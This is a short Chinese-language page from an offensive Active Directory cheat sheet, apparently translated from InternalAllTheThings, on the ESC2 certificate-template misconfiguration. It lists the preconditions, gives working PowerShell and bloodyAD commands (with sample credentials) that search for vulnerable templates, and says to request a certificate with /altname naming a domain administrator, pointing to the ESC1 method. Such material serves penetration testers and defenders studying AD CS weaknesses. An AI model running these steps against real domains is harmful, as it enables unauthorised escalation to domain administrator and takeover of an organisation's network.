# Active Directory - 证书 ESC2

## ESC2 - 错误配置的证书模板

**前提条件**

* 允许请求者在 CSR 中指定主体备用名称（SAN），且允许任意用途 EKU（2.5.29.37.0）

**利用方法**

* 查找模板

  ```ps1
  PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
  # 或
  python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'
  ```

* 请求证书时使用 `/altname` 指定域管理员身份，方法与 [ESC1 - 错误配置的证书模板](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc01/) 相同。

## 参考资料
